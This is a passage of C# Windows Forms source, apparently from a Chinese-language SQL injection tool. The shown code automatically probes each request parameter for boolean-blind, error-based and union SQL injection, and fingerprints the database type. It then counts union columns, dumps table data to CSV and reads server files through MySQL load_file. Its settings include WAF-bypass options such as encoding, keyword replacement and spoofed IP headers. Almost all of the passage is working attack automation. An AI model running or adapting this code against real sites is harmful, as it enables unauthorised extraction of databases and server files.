                String strparam = data.Replace("<sEncode>", "").Replace("<eEncode>", "").Replace("#inject#", "");

                //获取原始的页面信息
                String request = config.request.Replace(data, strparam);
                ServerInfo oserver = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, "获取原始页面", request, config.timeOut, HTTP.AutoGetEncoding, config.is_foward_302, config.redirectDoGet);


                if (!HTTP.AutoGetEncoding.Equals(config.encoding)){
                    //自定义
                    if (!config.encoding.Equals(oserver.encoding))
                    {
                        DialogResult dr = MessageBox.Show("自动识别发现网页编码为“" + oserver.encoding + ",而你选择的编码是“" + config.encoding + "””，是否采用自定义编码，不选择将自动识别！", "提示信息", MessageBoxButtons.YesNo);
                        if (DialogResult.No.Equals(dr))
                        {
                            this.cbox_basic_encoding.Text = HTTP.AutoGetEncoding;
                        }
                    }
                }
                else {
                    //自动识别
                    if (String.IsNullOrEmpty(oserver.encoding))
                    {
                        DialogResult dr = MessageBox.Show("自动识别未发现网页编码，是否人工选择一个编码，不选择将默认采用" + HTTP.DefaultEncoding + "编码？", "提示信息", MessageBoxButtons.YesNo);
                        if (DialogResult.Yes.Equals(dr))
                        {
                            this.btn_autoInject.Text = "自动识别";
                            autoinject = 0;
                            return;
                        }
                    }
                    else {
                        MessageBox.Show("自动识别网页编码为：“"+oserver.encoding+"”");
                    }
                }


                //拆分参数
                String[] strparams = strparam.Split('&');
                this.Invoke(new StringDelegate(log), "报告大侠，发现" + strparams.Length + "个参数，请稍候正在对每一个参数进行注入测试！");
                foreach (String param in strparams)
                {

                    String unionStartPayLoad = "";
                    if (String.IsNullOrEmpty(param))
                    {
                        continue;
                    }
                    this.Invoke(new StringDelegate(log), "报告大侠，正在对参数参数" + param + "进行盲注测试！");
                    String newParam = "";//标记注入
                    String payload_location = strparam.Replace(param, param + "<sEncode>#inject#<eEncode>");
                    String payload_request = request.Replace(strparam, payload_location);
                    String currentDB = "UnKnow";
                    //读取payload
                    List<String> list = FileTool.readFileToList("config/injection/injection.txt");

                    //判断存在bool盲注
                    bool boolInject = false;
                    bool errorInject = false;
                    bool unionInject = false;

                    if (list != null && list.Count > 0)
                    {
                        foreach (String pal in list)
                        {
                            this.Invoke(new StringDelegate(log), "正在测试PayLoad:" + pal);
                            String[] pals = pal.Split(':');

                            ServerInfo falseServer = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, pals[1], payload_request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                            decimal pfalse = Tools.getLike(oserver.body, falseServer.body);
                            if (pfalse > 99)
                            {
                                continue;
                            }
                            ServerInfo trueServer = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, pals[0], payload_request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                            decimal ptrue = Tools.getLike(oserver.body, trueServer.body);
                            if (oserver.code != 404 && !InjectionTools.errer_code.Contains(oserver.code.ToString()) && !InjectionTools.errer_code.Contains(trueServer.code.ToString()) && !InjectionTools.errer_code.Contains(falseServer.code.ToString()) && trueServer.body.Length > 0 && falseServer.body.Length > 0)
                            {

                                //判断存在bool盲注
                                //根据状态码判断
                                if (oserver.code == trueServer.code && trueServer.code != falseServer.code)
                                {
                                    //选择盲注配置
                                    this.txt_inject_key.Text = oserver.code + "";
                                    this.cbox_inject_type.SelectedIndex = Convert.ToInt32(KeyType.Code);
                                    this.chk_inject_reverseKey.Checked = false;
                                    boolInject = true;
                                    this.Invoke(new StringDelegate(log), "根据状态码判断存在SQL注入!");
                                }

                                if (falseServer.body.Length < trueServer.body.Length)
                                {
                                    if (ptrue == 100)
                                    {

                                        if (ptrue > pfalse)
                                        {
                                            //根据相似度判断
                                            this.Invoke(new StringDelegate(log), "根据相似度判断存在SQL注入！固定长度,相似度--false|true1|true2--" + pfalse + "|" + ptrue + "%");
                                            boolInject = true;
                                            //判断关键字
                                            checkTheKey(trueServer, falseServer, oserver);
                                        }
                                    }
                                    else {

                                        ServerInfo true1Server = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, pals[0].Replace("1%3d1", "2%3d2"), payload_request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                                      
                                        decimal p = Tools.getLike(oserver.body, true1Server.body);
                                        if (ptrue - pfalse >= 2 && Math.Abs(p - pfalse) >= 2)
                                        {
                                            //根据相似度判断
                                            this.Invoke(new StringDelegate(log), "根据相似度判断存在SQL注入！动态长度,相似度--false|true1|true2--" + pfalse + "|" + ptrue + "|" + p + "%");
                                            boolInject = true;
                                            //判断关键字
                                            checkTheKey(trueServer, falseServer, oserver);
                                        }


                                    }
                                }
                            }
                            else
                            {
                                this.Invoke(new StringDelegate(log), "程序判断不存在SQL注入！");
                            }

                            if (boolInject)
                            {

                                this.Invoke(new StringDelegate(log), "存在" + pals[2] + "payload:" + pals[0]);
                                selectInjectType(1);
                                //识别数据库
                                List<String> database_lsit = FileTool.readAllDic("config/database/");

                                foreach (String d in database_lsit)
                                {
                                    if (!"UnKnow".Equals(currentDB))
                                    {
                                        break;
                                    }
                                    String db = d.Replace(".txt", "");
                                    this.Invoke(new StringDelegate(log), "正在判断是否是" + db + "数据库");

                                    List<String> dbpayload_list = FileTool.readFileToList("config/database/" + d);
                                    foreach (String cdpay in dbpayload_list)
                                    {
                                        ServerInfo dbServer = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, pals[0].Replace("1=1", cdpay), payload_request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                                        if (config.useCode && trueServer.code == dbServer.code)
                                        {
                                            this.Invoke(new StringDelegate(log), "程序判断数据库为" + db + "数据库");
                                            currentDB = db;
                                            selectDB(currentDB);
                                            break;
                                        }
                                        else if (dbServer.length >= oserver.length && dbServer.code == oserver.code)
                                        {
                                            //根据关键字判断
                                            if (dbServer.body.IndexOf(config.key) != -1)
                                            {
                                                this.Invoke(new StringDelegate(log), "程序判断数据库为" + db + "数据库");
                                                currentDB = db;
                                                selectDB(currentDB);
                                                break;
                                            }
                                        }

                                    }
                                }
                                //用于标记注入的新字符
                                newParam = strparam.Replace(param, param + "<sEncode>" + pals[0].Replace(" and 1=1", "#inject#") + "<eEncode>");
                                if (pals[0].StartsWith(" "))
                                {
                                    unionStartPayLoad = "";
                                }
                                else
                                {
                                    unionStartPayLoad = pals[0].Split(' ')[0];
                                }

                                if (!String.IsNullOrEmpty(currentDB))
                                {

                                    selectDB(currentDB);
                                }
                                else
                                {
                                    //通过错误显示判断
                                    ServerInfo errorDBServer = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, "'test", payload_request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);

                                    String basePath = "config/injection/error/";
                                    List<String> errorDBList = FileTool.readAllDic(basePath);
                                    String cdb = "";
                                    foreach (String ep in errorDBList)
                                    {
                                        if (!String.IsNullOrEmpty(cdb)) break;
                                        List<String> errorKeys = FileTool.readFileToList(basePath + ep);

                                        foreach (String key in errorKeys)
                                        {

                                            bool find = Regex.IsMatch(errorDBServer.body, key, RegexOptions.IgnoreCase);
                                            if (find)
                                            {
                                                currentDB = ep.Replace(".txt", "");
                                                break;
                                            }
                                        }

                                    }
                                    if (!String.IsNullOrEmpty(currentDB))
                                    {
                                        selectDB(currentDB);
                                        this.Invoke(new StringDelegate(log), "通过错误显示发现数据库为" + currentDB + "！");
                                    }
                                    else
                                    {
                                        this.Invoke(new StringDelegate(log), "没有发现发现数据库类型，可能是其他数据库，请人工判断！");
                                    }
                                }

                                break;
                            }
                        }
                    }
                    else
                    {
                        this.Invoke(new StringDelegate(log), "报告大侠，没有读取到config/injection/injection.txt注入测试payload！");
                    }

                    //错误注入测试
                    this.Invoke(new StringDelegate(log), "报告大侠，盲注测试完成，正在进行错误显示注入测试！");

                    if (currentDB.Equals("Access"))
                    {

                        this.Invoke(new StringDelegate(log), "报告大侠，Access数据库不支持错误显示注入，已自动跳过！");
                    }
                    else
                    {
                        //读取payload
                        List<String> error_list = FileTool.readFileToList("config/injection/error_injection.txt");
                        if (error_list != null && error_list.Count > 0)
                        {
                            foreach (String cpal in error_list)
                            {
                                String[] pals = cpal.Split(':');

                                ServerInfo errorServer = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, pals[0], payload_request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);

                                if (errorServer.body.IndexOf(pals[1]) != -1)
                                {
                                    this.Invoke(new StringDelegate(log), "发现" + pals[2]);
                                    selectDB(pals[3]);
                                    //标记注入
                                    selectInjectType(2);
                                    errorInject = true;
                                    newParam = strparam.Replace(param, param + pals[4]);
                                    this.Invoke(new StringDelegate(log), "自动标记错误显示注入完成！");
                                    break;
                                }

                            }
                        }
                        else
                        {
                            this.Invoke(new StringDelegate(log), "没有读取到错误显示注入测试payload！");
                        }

                    }
                    this.Invoke(new StringDelegate(log), "报告大侠，错误显示测试完成，正在进行Union注入测试！");
                    //union注入

                    //最大100列
                    String payload = "";

                    if ("SQLServer".Equals(currentDB))
                    {
                        payload = unionStartPayLoad + "{payload};--";

                    }
                    else if ("MySQL".Equals(currentDB))
                    {
                        payload = unionStartPayLoad + "{payload}#";
                    }
                    else if ("Access".Equals(currentDB))
                    {
                        //处理%16不能被URL
                        payload = unionStartPayLoad + "{payload}";
                    }
                    else
                    {
                        payload = unionStartPayLoad + "{payload}-- ";

                    }
                    //判断总列数
                    Boolean isFind = false;
                    for (int i = 1; i <= config.maxClolumns; i++)
                    {
                        if (isFind)
                        {
                            break;
                        }
                        int basestr = 1111111;

                        String unionPayload = payload.Replace("{payload}", Comm.unionColumnCountTest(i, basestr));

                        if ("Oracle".Equals(currentDB))
                        {
                            unionPayload = payload.Replace("{payload}", Comm.unionColumnCountTestByOracle(i, "null"));
                        }
                        if ("Access".Equals(currentDB))
                        {
                            //%16不能被URL编码
                            payload_request = request.Replace(strparam, payload_location + "%16");
                            unionPayload = payload.Replace("{payload}", Comm.unionColumnCountTest(i, basestr) + " from MSysAccessObjects");
                        }

                        ServerInfo errorServer = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, unionPayload, payload_request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);

                        if ("Oracle".Equals(currentDB) && (errorServer.body.IndexOf("null") != -1 || errorServer.body.IndexOf("NULL") != -1))
                        {
                            for (int j = 1; j <= i; j++)
                            {
                                unionPayload = payload.Replace("{payload}", Comm.unionColumnCountTestByOracle(i, j, "chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)"));

                                ServerInfo oracleunionServer = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, unionPayload, payload_request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                                if (errorServer.code == 200 && oracleunionServer.body.IndexOf("1111111111") != -1)
                                {
                                    isFind = true;
                                    newParam = strparam.Replace(param, param + "<sEncode>" + payload.Replace("{payload}", "#inject#") + "<eEncode>");
                                    if ("Access".Equals(currentDB))
                                    {
                                        //%16不能被URL编码
                                        newParam = strparam.Replace(param, param + "<sEncode>" + payload.Replace("{payload}", "#inject#") + "<eEncode>%16");
                                    }
                                    unionInject = true;
                                    this.cbox_basic_injectType.SelectedIndex = 1;
                                    this.txt_inject_unionColumnsCount.Text = i + "";
                                    this.txt_inject_showColumn.Text = j + "";
                                    break;
                                }
                            }
                        }
                        else
                        {
                            for (int j = 1; j <= i; j++)
                            {
                                String basecolumn = (basestr + j).ToString();
                                if (errorServer.code == 200 && errorServer.body.IndexOf((basecolumn)) != -1)
                                {
                                    isFind = true;
                                    newParam = strparam.Replace(param, param + "<sEncode>" + payload.Replace("{payload}", "#inject#") + "<eEncode>");
                                    selectInjectType(3);
                                    unionInject = true;
                                    this.txt_inject_unionColumnsCount.Text = i + "";
                                    this.txt_inject_showColumn.Text = j + "";
                                    break;
                                }
                            }
                        }


                    }
                    if (isFind)
                    {

                        this.Invoke(new StringDelegate(log), "此注入点支持Union注入，自动选择注入方式完成！");
                    }
                    if (boolInject || errorInject || unionInject)
                    {
                        //替换注入位置-标记注入
                        this.txt_inject_request.Text = request.Replace(strparam, newParam);
                    }

                }


            }
            catch (Exception e)
            {

                Tools.SysLog("识别注入发生异常！" + e.Message);
                this.Invoke(new StringDelegate(log), "识别注入发生异常！" + e.Message);
            }
            this.Invoke(new StringDelegate(log), "注入测试完成！");
            this.btn_autoInject.Text = "自动识别";
            autoinject = 0;
        }
        public void selectInjectType(int index)
        {
            this.cbox_basic_injectType.SelectedIndex = index;
        }
        public void selectDB(String currentDB)
        {

            if ("UnKnow".Equals(currentDB))
            {

                this.cbox_basic_dbType.SelectedIndex = 0;
            }
            if ("Access".Equals(currentDB))
            {

                this.cbox_basic_dbType.SelectedIndex = 1;
            }
            else if ("MySQL".Equals(currentDB))
            {

                this.cbox_basic_dbType.SelectedIndex = 2;
            }
            else if ("SQLServer".Equals(currentDB))
            {

                this.cbox_basic_dbType.SelectedIndex = 3;
            }
            else if ("Oracle".Equals(currentDB))
            {

                this.cbox_basic_dbType.SelectedIndex = 4;
            }
            this.Invoke(new StringDelegate(log), "自动选择数据库类型完成！");
        }

        private void data_dbs_tsl_getDatas_Click(object sender, EventArgs e)
        {

            if (MyThreadPool.GetAliveThreadsCount() == 0)
            {

                if (!checkConfig())
                {
                    return;
                }
                if (!isSetInjectPoint())
                {
                    return;
                }

                status = 1;
                List<String> list_columns = new List<String>();
                foreach (ColumnHeader ch in this.data_dbs_lvw_data.Columns)
                {
                    list_columns.Add(ch.Text);
                }
                if (list_columns.Count > 0)
                {

                    this.data_dbs_lvw_data.Items.Clear();
                }
                this.currentDataCount = 0;
                this.currentThread = new Thread(new ParameterizedThreadStart(getData));
                this.currentThread.Start(list_columns);
            }
            else
            {
                MessageBox.Show("还有线程未结束，请稍候....");
            }

        }
        public int export = 0;
        private void data_dbs_tsl_exportDatas_Click(object sender, EventArgs e)
        {

            if (export == 0)
            {
                //保存文件
                SaveFileDialog saveFileDialog = new SaveFileDialog();
                saveFileDialog.Filter = "文本文件|*.csv";
                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    export = 1;
                    Thread eth = new Thread(exportData);
                    eth.Start(saveFileDialog.FileName);
                }
            }
            else
            {

                MessageBox.Show("请稍候，还有导出任务正在进行！");
            }
            export = 0;
        }

        public void exportData(Object path)
        {
            try
            {
                FileStream fs = new FileStream(path.ToString(), FileMode.OpenOrCreate, FileAccess.Write);
                StreamWriter sw = new StreamWriter(fs);
                String columns = "";
                foreach (ColumnHeader dc in this.data_dbs_lvw_data.Columns)
                {
                    columns += ("\"" + dc.Text + "\",");
                }
                sw.WriteLine(columns.Substring(0, columns.Length - 1));
                foreach (ListViewItem sv in this.data_dbs_lvw_data.Items)
                {
                    StringBuilder sb = new StringBuilder();
                    foreach (ListViewItem.ListViewSubItem subv in sv.SubItems)
                    {
                        sb.Append("\"" + subv.Text + "\",");
                    }
                    sb.Remove(sb.Length - 1, 1);
                    sw.WriteLine(sb.ToString());
                }
                sw.Close();
                MessageBox.Show("导出完成！");
            }
            catch (Exception e)
            {
                Tools.SysLog("导出数据发生异常！" + e.Message);
                MessageBox.Show("导出数据发生异常！");
            }
            export = 0;

        }

        private void cbox_basic_injectType_SelectedIndexChanged(object sender, EventArgs e)
        {
            switch (this.cbox_basic_injectType.SelectedIndex)
            {

                case 0:
                    config.injectType = InjectType.UnKnow;
                    break;

                case 1:
                    config.injectType = InjectType.Bool;
                    break;
                case 2:
                    config.injectType = InjectType.Error;
                    break;
                case 3:
                    config.injectType = InjectType.Union;
                    break;
                case 4:
                    config.injectType = InjectType.Sleep;
                    break;
            }
        }

        private void cbox_basic_dbType_SelectedIndexChanged(object sender, EventArgs e)
        {
            switch (this.cbox_basic_dbType.SelectedIndex)
            {

                case 0:
                    config.dbType = DBType.UnKnow;
                    break;
                case 1:
                    config.dbType = DBType.Access;
                    break;
                case 2:
                    config.dbType = DBType.MySQL5;
                    break;
                case 3:
                    config.dbType = DBType.SQLServer;
                    break;
                case 4:
                    config.dbType = DBType.Oracle;
                    break;
                case 5:
                    config.dbType = DBType.MySQL4;
                    break;
            }
        }
        private void txt_inject_unionColumnsCount_TextChanged(object sender, EventArgs e)
        {
            if (!String.IsNullOrEmpty(this.txt_inject_unionColumnsCount.Text))
            {
                config.columnsCount = int.Parse(this.txt_inject_unionColumnsCount.Text);
            }

        }

        private void txt_inject_showColumn_TextChanged(object sender, EventArgs e)
        {
            if (!String.IsNullOrEmpty(this.txt_inject_showColumn.Text))
            {
                config.showColumn = int.Parse(this.txt_inject_showColumn.Text);
            }
        }

        private void txt_inject_key_TextChanged(object sender, EventArgs e)
        {
            if (!String.IsNullOrEmpty(this.txt_inject_key.Text))
            {
                config.key = this.txt_inject_key.Text;
                config.maxTime = Tools.convertToInt(config.key);
                if (config.maxTime == 0 && config.keyType.Equals(KeyType.Time))
                {
                    MessageBox.Show("输入的判断值不是数字，请重新输入判断值，单位秒！");
                }
            }
        }

        private void tsmi_seting_Click(object sender, EventArgs e)
        {
            Seting set = new Seting(this);
            set.Show();
        }

        private void Main_FormClosing(object sender, FormClosingEventArgs e)
        {

            try
            {
                XML.saveConfig("lastConfig.xml", this.config);
            }
            catch (Exception ex)
            {
                Tools.SysLog("保存配置发生错误！" + ex.Message);
            }

            System.Environment.Exit(0);
        }

        private void tsmi_about_Click(object sender, EventArgs e)
        {
            About ab = new About();
            ab.Show();
        }

        private void tsmi_mustRead_Click(object sender, EventArgs e)
        {
            Waring w = new Waring();
            w.Show();
        }

        private void chk_inject_foward_302_CheckedChanged(object sender, EventArgs e)
        {
            config.is_foward_302 = this.chk_inject_foward_302.Checked;
        }


        private void btn_exportConfig_Click(object sender, EventArgs e)
        {
            SaveFileDialog saveFileDialog = new SaveFileDialog();
            saveFileDialog.Filter = "XML文件|*.xml";
            if (saveFileDialog.ShowDialog() == DialogResult.OK)
            {
                XML.saveConfig(saveFileDialog.FileName, config);
                MessageBox.Show("导出成功！");
            }


        }

        private void chk_openURLEncoding_CheckedChanged(object sender, EventArgs e)
        {
            config.isOpenURLEncoding = this.chk_openURLEncoding.Checked;
        }

        private void data_cms_tsmi_copyVerValue_Click(object sender, EventArgs e)
        {
            if (this.data_lvw_ver.SelectedItems.Count == 0)
            {
                return;
            }
            Clipboard.SetText(this.data_lvw_ver.SelectedItems[0].SubItems[1].Text);
            MessageBox.Show("复制成功！");
        }

        private void data_cms_tsmi_stopGetVariable_Click(object sender, EventArgs e)
        {

            StopThread();
        }

        private void data_dbs_tsmi_getTableNames_Click(object sender, EventArgs e)
        {
            TreeNode tn = this.data_tvw_dbs.SelectedNode;
            if (tn != null)
            {
                tn.BeginEdit();
            }
        }

        private void chk_useSSL_CheckedChanged(object sender, EventArgs e)
        {
            if (this.chk_useSSL.Checked)
            {
                config.useSSL = true;
                this.txt_basic_port.Text = "443";
            }
            else
            {
                config.useSSL = false;
                this.txt_basic_port.Text = "80";
            }
        }

        private void data_dbs_tsmi_stopGetInfos_Click(object sender, EventArgs e)
        {
            StopThread();
        }

        private void data_tvw_dbs_AfterCheck(object sender, TreeViewEventArgs e)
        {
            String cname = e.Node.Text;
            Boolean isColumn = e.Node.Tag.ToString().Equals("column");
            Boolean isTable = e.Node.Tag.ToString().Equals("table");
            Boolean isDB = e.Node.Tag.ToString().Equals("dbs");
            if (!e.Node.Checked)
            {
                if (isDB || isTable)
                {
                    //不选
                    foreach (TreeNode tn in e.Node.Nodes)
                    {
                        if (tn.Checked)
                        {
                            tn.Checked = false;
                        }

                    }
                }
                if (isColumn)
                {

                    foreach (ColumnHeader dc in this.data_dbs_lvw_data.Columns)
                    {
                        if (dc.Text.Equals(cname))
                        {
                            this.data_dbs_lvw_data.Columns.Remove(dc);
                        }

                    }
                }
            }
            else
            {
                if (isTable)
                {
                    foreach (TreeNode tn in this.data_tvw_dbs.Nodes)
                    {
                        if (tn.Checked && tn != e.Node.Parent)
                        {
                            tn.Checked = false;
                        }

                    }
                }

                if (isColumn)
                {
                    foreach (TreeNode tn in e.Node.Parent.Parent.Nodes)
                    {
                        if (tn.Checked && tn != e.Node.Parent)
                        {
                            tn.Checked = false;
                        }

                    }
                    e.Node.Parent.Checked = true;

                    if (!this.curren_table.Equals(e.Node.Parent.Text))
                    {
                        this.data_dbs_lvw_data.Columns.Clear();
                    }
                    ColumnHeader ch = new ColumnHeader("col_" + cname);
                    bool isExists = false;
                    foreach (ColumnHeader dc in this.data_dbs_lvw_data.Columns)
                    {
                        if (dc.Text.Equals(cname))
                        {
                            isExists = true;
                            break;
                        }

                    }
                    if (!isExists)
                    {
                        ch.Text = cname;
                        this.data_dbs_lvw_data.Columns.Add(ch);
                    }
                    //设置当前数据库和表
                    this.curren_db = e.Node.Parent.Parent.Text;
                    this.curren_table = e.Node.Parent.Text;
                }
            }
        }

        private void data_tvw_dbs_AfterSelect(object sender, TreeViewEventArgs e)
        {
            if (e.Node.Checked)
            {
                e.Node.Checked = false;
            }
            else
            {
                e.Node.Checked = true;
            }
        }

        private void data_dbs_lvw_tsmi_stop_Click(object sender, EventArgs e)
        {
            StopThread();
        }

        private void txt_basic_host_TextChanged(object sender, EventArgs e)
        {
            config.domain = this.txt_basic_host.Text;
        }

        private void txt_basic_port_TextChanged(object sender, EventArgs e)
        {
            config.port = Tools.convertToInt(this.txt_basic_port.Text);
        }

        private void txt_inject_request_TextChanged(object sender, EventArgs e)
        {
            config.request = this.txt_inject_request.Text;
        }

        private void chk_inject_reverseKey_CheckedChanged(object sender, EventArgs e)
        {
            config.reverseKey = this.chk_inject_reverseKey.Checked;
        }

        private void tsmi_openConfig_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog { Filter = "XML文件(*.xml)|*.*" };
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                this.config = XML.readConfig(ofd.FileName);
                reloadConfig(this.config);
                MessageBox.Show("加载配置成功！");
            }
        }

        public void reloadConfig(Config config)
        {

            this.txt_basic_host.Text = config.domain;
            this.txt_basic_port.Text = config.port + "";
            this.cbox_basic_timeOut.Text = config.timeOut + "";
            this.cbox_basic_encoding.Text = config.encoding;

            switch (config.injectType)
            {

                case InjectType.UnKnow:
                    this.cbox_basic_injectType.SelectedIndex = 0;
                    break;
                case InjectType.Bool:
                    this.cbox_basic_injectType.SelectedIndex = 1;
                    break;
                case InjectType.Error:
                    this.cbox_basic_injectType.SelectedIndex = 2;
                    break;
                case InjectType.Union:
                    this.cbox_basic_injectType.SelectedIndex = 3;
                    break;

            }
            switch (config.dbType)
            {

                case DBType.UnKnow:
                    this.cbox_basic_dbType.SelectedIndex = 0;
                    break;
                case DBType.Access:
                    this.cbox_basic_dbType.SelectedIndex = 1;
                    break;
                case DBType.MySQL5:
                    this.cbox_basic_dbType.SelectedIndex = 2;
                    break;
                case DBType.SQLServer:
                    this.cbox_basic_dbType.SelectedIndex = 3;
                    break;
                case DBType.Oracle:
                    this.cbox_basic_dbType.SelectedIndex = 4;
                    break;
                case DBType.MySQL4:
                    this.cbox_basic_dbType.SelectedIndex = 5;
                    break;
            }
            this.data_dbs_cob_db_encoding.Text = config.db_encoding;
            this.cbox_basic_threadSize.Text = config.threadSize + "";
            this.cbox_basic_reTryCount.Text = config.reTry + "";
            this.txt_inject_key.Text = config.key;
            this.chk_inject_foward_302.Checked = config.is_foward_302;
            this.chk_inject_reverseKey.Checked = config.reverseKey;

            switch (config.keyType)
            {

                case KeyType.Key:
                    this.cbox_inject_type.SelectedIndex = 0;
                    break;
                case KeyType.Code:
                    this.cbox_inject_type.SelectedIndex = 1;
                    break;
                case KeyType.Length:
                    this.cbox_inject_type.SelectedIndex = 2;
                    break;
                case KeyType.Time:
                    this.cbox_inject_type.SelectedIndex = 3;
                    config.maxTime = Tools.convertToInt(config.key);
                    break;
            }

            this.chk_openURLEncoding.Checked = config.isOpenURLEncoding;
            this.chk_useSSL.Checked = config.useSSL;
            this.txt_inject_unionColumnsCount.Text = config.columnsCount + "";
            this.txt_inject_showColumn.Text = config.showColumn + "";

            this.txt_inject_request.Text = config.request;
            //file

            this.cbox_file_readFileEncoding.Text = config.readFileEncoding;

            //cmd
            this.cmd_chk_showCmdResult.Checked = config.showCmdResult;
            //bypass
            this.bypass_chk_inculdeStr.Checked = config.inculdeStr;
            this.cob_keyRepalce.SelectedIndex = config.keyReplace;
            this.bypass_chk_base64.Checked = config.base64;
            this.cbox_base64Count.SelectedIndex = config.base64Count-1;
            this.cbox_bypass_urlencode_count.SelectedIndex = config.urlencodeCount - 1;

            //替换字符
            this.chk_reaplaceBeforURLEncode.Checked = config.reaplaceBeforURLEncode;
            String[] replaceStrs = Regex.Split(config.replaceStrs, "\\n");
            config.replaceStrs = config.replaceStrs.Replace("\t\n","");
            if (replaceStrs.Length > 0)
            {

                foreach (String line in replaceStrs)
                {
                    String[] strs = Regex.Split(line, "\\t");
                    if (strs.Length == 2)
                    {
                        if (!String.IsNullOrEmpty(strs[0])&& !this.replaceList.Contains(strs[0])) {
                            this.replaceList.Add(strs[0], strs[1]);
                            ListViewItem lvi = new ListViewItem(strs[0]);
                            lvi.SubItems.Add(strs[1]);
                            lvi.Name = strs[1];
                            this.bypass_lvw_replaceString.Items.Add(lvi);
                        }
                    }
                }

            }

            this.bypass_cbox_sendHTTPSleepTime.Text = config.sendHTTPSleepTime + "";
            this.bypass_cbox_randIPToHeader.Text = config.randIPToHeader;

           



        }

        public FindString fs = null;
        public void showFindString(object sender, KeyEventArgs e, TextBox textBox)
        {
            if (e.Control && e.KeyCode == Keys.F)
            {
                if (fs == null)
                {

                    fs = new FindString();

                }
                fs.txtbox = textBox;
                fs.ShowDialog();
            }
        }


        private void log_txt_response_KeyDown(object sender, KeyEventArgs e)
        {
            showFindString(sender, e, this.log_txt_response);
            if (e.Modifiers == Keys.Control && e.KeyCode == Keys.A)
            {
                ((TextBox)sender).SelectAll();
            }
        }

        private void txt_inject_request_KeyDown(object sender, KeyEventArgs e)
        {
            showFindString(sender, e, this.txt_inject_request);
            if (e.Modifiers == Keys.Control && e.KeyCode == Keys.A)
            {
                ((TextBox)sender).SelectAll();
            }
        }

        private void data_dbs_lvw_tsmi_copyLineData_Click(object sender, EventArgs e)
        {
            if (this.data_dbs_lvw_data.SelectedItems.Count > 0)
            {
                ListViewItem lvi = this.data_dbs_lvw_data.SelectedItems[0];
                StringBuilder str = new StringBuilder();
                foreach (ListViewItem.ListViewSubItem clvi in lvi.SubItems)
                {
                    str.Append(clvi.Text + "----");
                }
                if (str.Length > 0)
                {
                    //清空剪切板内容
                    Clipboard.Clear();
                    //复制内容到剪切板
                    Clipboard.SetData(DataFormats.Text, str.Remove(str.Length - 4, 4));
                    MessageBox.Show("复制成功！");
                }

            }
        }

        private void tsmi_saveConfig_Click(object sender, EventArgs e)
        {
            SaveFileDialog saveFileDialog = new SaveFileDialog();
            saveFileDialog.Filter = "XML文件|*.xml";
            if (saveFileDialog.ShowDialog() == DialogResult.OK)
            {
                XML.saveConfig(saveFileDialog.FileName, config);
            }

            MessageBox.Show("导出成功！");
        }

        private void tsmi_update_Click(object sender, EventArgs e)
        {
            new Thread(checkUpdate).Start();
        }

        private void timer_status_Tick(object sender, EventArgs e)
        {
            this.runTime++;
            this.status_lbl_time.Text = this.runTime + "s";
            this.status_lbl_threadStatus.Text = MyThreadPool.getCurrentThreadCount() + "/" + this.cbox_basic_threadSize.Text;

            getDBStatus();
            this.status_lbl_dbsCount.Text = this.currentDbsCount + "/" + this.dbsCount;
            this.status_lbl_tableCount.Text = this.currentTableCount + "/" + this.tableCount;
            if (this.currentDataCount == 0)
            {
                this.currentDataCount = this.data_dbs_lvw_data.Items.Count;
            }
            this.status_lbl_dataCount.Text = this.currentDataCount + "/" + this.dataCount;
            if (MyThreadPool.getCurrentThreadCount() <= 0)
            {
                this.status_lbl_runStatus.Text = "未开始";
            }
            else
            {

                this.status_lbl_runStatus.Text = "正在运行";
            }
            this.status_lbl_all_status.Text = comm_currentCount + "/" + comm_count;
            this.lbl_packsCount.Text = HTTP.index.ToString();

        }

        public void getDBStatus()
        {

            this.currentDbsCount = 0;
            this.currentTableCount = 0;
            foreach (TreeNode tn in this.data_tvw_dbs.Nodes)
            {

                if ("dbs".Equals(tn.Tag))
                {

                    this.currentDbsCount++;
                    foreach (TreeNode ctn in tn.Nodes)
                    {

                        if ("table".Equals(ctn.Tag))
                        {

                            this.currentTableCount++;
                        }
                    }
                }
            }
        }
        String[] ver_tmp = null;
        public void file_txt_resultSetText(String text)
        {
            this.file_txt_result.Text = text;
        }

        public void cmd_txt_resultSetText(String text)
        {
            this.cmd_txt_result.Text = text;
        }

        public void readOrWriteFile()
        {
            String path = this.file_txt_filePath.Text;
            String path_16 = Tools.strToHex(path, "UTF-8");
            String data_payload = "";
            if (Thread.CurrentThread.Name == null)
            {
                Thread.CurrentThread.Name = "FileThread-";
            }
            if (this.file_cbox_readWrite.SelectedIndex == 0)
            {
                data_payload = MySQL5.hex.Replace("{data}", "load_file(" + path_16 + ")");
                switch (config.injectType)
                {
                    case InjectType.Bool:
                        try
                        {
                            if (String.IsNullOrEmpty(config.key))
                            {
                                MessageBox.Show("大侠，请在注入中心，配置Bool盲注的关键字！");
                                return;
                            }
                            String payload_len = MySQL5.ver_length.Replace("{data}", data_payload);
                            int len = getValueByStepUp(payload_len, 0, 50000);
                            this.dataCount = len;
                            String value = "";
                            ver_tmp = new String[len];
                            //获取值
                            for (int i = 0; i < len; i++)
                            {
                                MyThreadPool.initThread(new ParameterizedThreadStart(readOrWriteFileByMySQLByHexAscii), data_payload + "#" + i);
                                this.currentDataCount = i;
                            }
                            while (status == 1)
                            {

